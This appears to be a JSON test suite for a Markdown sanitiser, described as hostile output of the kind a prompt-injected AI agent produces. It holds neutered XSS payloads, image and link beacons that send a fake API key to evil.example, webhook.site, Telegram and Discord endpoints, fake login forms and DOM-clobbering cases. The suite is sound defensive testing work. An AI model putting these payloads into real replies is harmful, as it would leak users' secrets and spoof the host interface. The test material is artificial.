{
  "version": "2026-10-06",
  "description": "Hostile Markdown of the kind a prompt-injected agent produces, with the invariants a safe renderer must hold. Payload markers call p('<case id>') instead of doing harm. {{origin}} is replaced with the origin of the page under test.",
  "cases": [
    { "id": "script-tag", "category": "script-execution", "title": "<script> in Markdown", "input": "hi <script>p('script-tag')</script>",
      "expect": { "noExecution": true, "noElements": ["script"], "mustContainText": ["hi"] } },
    { "id": "img-onerror", "category": "script-execution", "title": "<img onerror>", "input": "<img src=\"./nonexistent.png\" onerror=\"p('img-onerror')\">",
      "expect": { "noExecution": true, "noAttributes": ["^on"] } },
    { "id": "svg-onload", "category": "script-execution", "title": "<svg onload>", "input": "<svg onload=\"p('svg-onload')\"><circle r=\"1\"/></svg>",
      "expect": { "noExecution": true, "noAttributes": ["^on"] } },
    { "id": "details-ontoggle", "category": "script-execution", "title": "<details open ontoggle>", "input": "<details open ontoggle=\"p('details-ontoggle')\">x</details>",
      "expect": { "noExecution": true, "noAttributes": ["^on"] } },
    { "id": "iframe-srcdoc", "category": "script-execution", "title": "<iframe srcdoc>", "input": "<iframe srcdoc=\"<script>parent.p('iframe-srcdoc')</script>\"></iframe>",
      "expect": { "noExecution": true, "noElements": ["iframe"] } },
    { "id": "input-autofocus-onfocus", "category": "script-execution", "title": "<input autofocus onfocus>", "input": "<input autofocus onfocus=\"p('input-autofocus-onfocus')\">",
      "expect": { "noExecution": true, "noElements": ["input"], "noAttributes": ["^on"] } },
    { "id": "html-block-in-list", "category": "script-execution", "title": "HTML block nested in a list item", "input": "- item\n\n  <img src=x onerror=\"p('html-block-in-list')\">",
      "expect": { "noExecution": true, "noAttributes": ["^on"] } },
    { "id": "link-title-injection", "category": "script-execution", "title": "attribute injection through a link title", "input": "[x](https://example.com/ \"t\\\" onclick=\\\"p('link-title-injection')\")",
      "expect": { "noExecution": true, "noAttributes": ["^on"] } },

    { "id": "link-javascript", "category": "url-schemes", "title": "javascript: link", "input": "[click](javascript:p('link-javascript'))",
      "expect": { "noUrlScheme": ["javascript"] } },
    { "id": "link-javascript-entity", "category": "url-schemes", "title": "entity-encoded javascript: link", "input": "[a](javascript&#58;p('x')) <a href=\"javascript&#x3A;p('x')\">b</a>",
      "expect": { "noUrlScheme": ["javascript"] } },
    { "id": "link-javascript-tab", "category": "url-schemes", "title": "javascript: with an embedded tab", "input": "<a href=\"java&#9;script:p('x')\">c</a>",
      "expect": { "noUrlScheme": ["javascript"] } },
    { "id": "link-vbscript", "category": "url-schemes", "title": "vbscript: link", "input": "[c](vbscript:MsgBox(1))",
      "expect": { "noUrlScheme": ["vbscript"] } },
    { "id": "link-data-html", "category": "url-schemes", "title": "data:text/html link", "input": "[c](data:text/html;base64,PHNjcmlwdD5wKCd4Jyk8L3NjcmlwdD4=)",
      "expect": { "noUrlScheme": ["data"] } },
    { "id": "autolink-javascript", "category": "url-schemes", "title": "javascript: autolink", "input": "<javascript:p('autolink-javascript')>",
      "expect": { "noUrlScheme": ["javascript"], "noExecution": true } },
    { "id": "img-data-svg", "category": "url-schemes", "title": "SVG through a data: image", "input": "![x](data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22p('img-data-svg')%22%2F%3E)",
      "expect": { "noUrlScheme": ["data"], "noExecution": true } },

    { "id": "img-remote-beacon", "category": "exfiltration", "title": "remote image beacon", "input": "![pixel](https://evil.example/leak.png)",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "img-remote-query-secret", "category": "exfiltration", "title": "remote image with data in the query", "input": "![pixel](https://evil.example/leak.png?c=the%20api%20key%20is%20sk-live-1)",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "img-sink-webhook", "category": "exfiltration", "title": "image to a request catcher", "input": "![p](https://webhook.site/abc-123/leak.png)",
      "expect": { "noRequestTo": ["webhook.site"] } },
    { "id": "img-protocol-relative", "category": "exfiltration", "title": "protocol-relative image", "input": "<img src=\"//evil.example/a.png\">",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "img-backslash", "category": "exfiltration", "title": "backslash host image", "input": "<img src=\"\\\\evil.example\\a.png\">",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "img-srcset", "category": "exfiltration", "title": "srcset to a remote host", "input": "<img src=\"./ok.svg\" srcset=\"https://evil.example/a.png 1x\">",
      "expect": { "noRequestTo": ["evil.example"], "noAttributes": ["^srcset$"] } },
    { "id": "link-ping", "category": "exfiltration", "title": "ping attribute", "input": "<a href=\"https://example.com/\" ping=\"https://evil.example/p\">x</a>",
      "expect": { "noAttributes": ["^ping$"] } },
    { "id": "video-poster", "category": "exfiltration", "title": "video poster and source", "input": "<video poster=\"https://evil.example/p.png\" src=\"https://evil.example/v.mp4\"></video>",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "audio-src", "category": "exfiltration", "title": "audio autoplay", "input": "<audio src=\"https://evil.example/a.mp3\" autoplay></audio>",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "object-data", "category": "exfiltration", "title": "<object data>", "input": "<object data=\"https://evil.example/o.svg\"></object>",
      "expect": { "noRequestTo": ["evil.example"], "noElements": ["object"] } },
    { "id": "link-stylesheet", "category": "exfiltration", "title": "<link rel=stylesheet>", "input": "<link rel=\"stylesheet\" href=\"https://evil.example/s.css\">",
      "expect": { "noRequestTo": ["evil.example"], "noElements": ["link"] } },
    { "id": "meta-refresh", "category": "exfiltration", "title": "<meta http-equiv=refresh>", "input": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">",
      "expect": { "noRequestTo": ["evil.example"], "noElements": ["meta"] } },
    { "id": "img-reference-style", "category": "exfiltration", "title": "reference-style image", "input": "![p][ref]\n\n[ref]: https://evil.example/r.png",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "picture-source", "category": "exfiltration", "title": "<picture><source srcset>", "input": "<picture><source srcset=\"https://evil.example/s.png\"><img src=\"./ok.svg\"></picture>",
      "expect": { "noRequestTo": ["evil.example"], "noElements": ["source"] } },
    { "id": "nested-image-link", "category": "exfiltration", "title": "image inside a link", "input": "[![img](https://evil.example/i.png)](https://evil.example/)",
      "expect": { "noRequestTo": ["evil.example"] } },
    { "id": "link-sink-telegram-bot", "category": "exfiltration", "title": "link to a chat bot API that posts its query", "input": "[open the report](https://api.telegram.org/bot123456:AAH-x/sendMessage?chat_id=1&text=the%20api%20key%20is%20sk-live-1)",
      "expect": { "noElements": ["a[href*=\"api.telegram.org\"]"], "mustContainText": ["open the report"] } },
    { "id": "link-sink-discord-webhook", "category": "exfiltration", "title": "link to a versioned chat webhook", "input": "[confirm](https://discord.com/api/v10/webhooks/123/abc?content=sk-live-1)",
      "expect": { "noElements": ["a[href*=\"discord.com\"]"], "mustContainText": ["confirm"] } },
    { "id": "link-sink-ip-logger", "category": "exfiltration", "title": "link through an IP logger", "input": "[docs](https://grabify.link/ABC123)",
      "expect": { "noElements": ["a[href*=\"grabify.link\"]"], "mustContainText": ["docs"] } },
    { "id": "link-sink-s3-regional", "category": "exfiltration", "title": "link to a regional object-storage endpoint", "input": "[download](https://drop.s3.eu-west-1.amazonaws.com/c?d=sk-live-1)",
      "expect": { "noElements": ["a[href*=\"amazonaws.com\"]"], "mustContainText": ["download"] } },
    { "id": "link-sink-function-url", "category": "exfiltration", "title": "link to a serverless function URL", "input": "[details](https://abcd1234.lambda-url.us-east-1.on.aws/?k=sk-live-1)",
      "expect": { "noElements": ["a[href*=\"on.aws\"]"], "mustContainText": ["details"] } },

    { "id": "form-password", "category": "ui-spoofing", "title": "password form inside the reply", "input": "<form action=\"https://evil.example/login\"><label>Session expired. Password: <input type=\"password\"></label><button>Sign in</button></form>",
      "expect": { "noElements": ["form", "input", "button"] } },
    { "id": "style-element", "category": "ui-spoofing", "title": "<style> restyling the host", "input": "<style>body { display: none }</style>",
      "expect": { "noElements": ["style"] } },
    { "id": "style-attribute-overlay", "category": "ui-spoofing", "title": "fixed overlay through a style attribute", "input": "<p style=\"position:fixed;inset:0;background:#fff\">I am the host UI</p>",
      "expect": { "noAttributes": ["^style$"] } },
    { "id": "class-hijack", "category": "ui-spoofing", "title": "borrowing host CSS classes", "input": "<p class=\"modal-open hidden\">x</p>",
      "expect": { "noClassNames": ["modal-open", "hidden"] } },
    { "id": "dialog-open", "category": "ui-spoofing", "title": "<dialog open>", "input": "<dialog open>Confirm the transfer</dialog>",
      "expect": { "noElements": ["dialog"] } },
    { "id": "button-fake-consent", "category": "ui-spoofing", "title": "a button that looks like consent UI", "input": "<button>Allow</button>",
      "expect": { "noElements": ["button"] } },

    { "id": "clobber-location", "category": "dom-clobbering", "title": "id=location", "input": "<a id=\"location\">x</a>",
      "expect": { "noIds": ["location"] } },
    { "id": "clobber-name-and-form", "category": "dom-clobbering", "title": "name=body and form id", "input": "<img name=\"body\" src=\"./ok.svg\"><form id=\"config\"></form>",
      "expect": { "noNames": ["body"], "noIds": ["config"], "noElements": ["form"] } },

    { "id": "code-block-payload", "category": "markdown", "title": "payload inside a fenced code block stays text", "input": "```html\n<img src=x onerror=\"p('code-block-payload')\">\n```",
      "expect": { "noExecution": true, "noElements": ["img"], "mustHave": ["pre code"], "mustContainText": ["onerror"] } },
    { "id": "inline-code", "category": "markdown", "title": "inline code stays text", "input": "use `<b>bold</b>` here",
      "expect": { "noElements": ["b"], "mustContainText": ["<b>bold</b>"] } },
    { "id": "mermaid-loose", "category": "markdown", "title": "Mermaid click handler with a javascript: URL", "input": "```mermaid\ngraph TD\nA-->B\nclick A href \"javascript:p('mermaid-loose')\"\n```",
      "expect": { "noExecution": true, "noUrlScheme": ["javascript"] } },

    { "id": "guard-basic", "category": "guard", "title": "ordinary Markdown must survive", "input": "# Title\n\nA paragraph with **bold**, a [link](https://example.com/docs) and `code`.\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |",
      "expect": { "mustHave": ["h1", "strong", "a[href=\"https://example.com/docs\"]", "code", "li", "table"], "mustContainText": ["Title", "one", "2"] } },
    { "id": "guard-same-origin-image", "category": "guard", "title": "same-origin image must render", "input": "![ok](./ok.svg)",
      "expect": { "mustHave": ["img[src]"] } },
    { "id": "guard-code-language", "category": "guard", "title": "code block language class must survive", "input": "```ts\nconst a = 1;\n```",
      "expect": { "mustHave": ["pre code.language-ts"], "mustContainText": ["const a = 1;"] } },
    { "id": "guard-mailto-tel", "category": "guard", "title": "mailto: and tel: links must survive", "input": "[mail](mailto:a@example.com) [tel](tel:+15550100)",
      "expect": { "mustHave": ["a[href^=\"mailto:\"]", "a[href^=\"tel:\"]"] } },
    { "id": "guard-target-blank", "category": "guard", "title": "target=_blank must carry rel=noopener if kept", "input": "<a href=\"https://example.com/\" target=\"_blank\">x</a>",
      "expect": { "relNoopenerOnTargetBlank": true, "mustHave": ["a[href=\"https://example.com/\"]"] } },

    { "id": "stream-image-cut", "category": "streaming", "title": "image URL received in pieces: no request before the closing parenthesis",
      "stream": { "chunks": ["Look: ![c]({{origin}}/ok.svg?stre", "am=stream-image-cut", ") done"], "requestUrlContains": "stream-image-cut", "noRequestsBeforeLast": true, "requestsAtEnd": 1 },
      "expect": { "mustHave": ["img"] } },
    { "id": "stream-link-cut", "category": "streaming", "title": "link received in pieces: no href before the URL closes",
      "stream": { "chunks": ["see [spec](https://example.com/v", "1) end"], "noElementsBeforeLast": ["a[href]"] },
      "expect": { "mustHave": ["a[href=\"https://example.com/v1\"]"] } },
    { "id": "stream-fence-open", "category": "streaming", "title": "open code fence renders as code while streaming",
      "stream": { "chunks": ["```js\nconst a = 1;", "\n```\nafter"], "mustHaveAfterEachChunk": ["pre code"] },
      "expect": { "mustHave": ["pre code"], "mustContainText": ["after"] } }
  ]
}
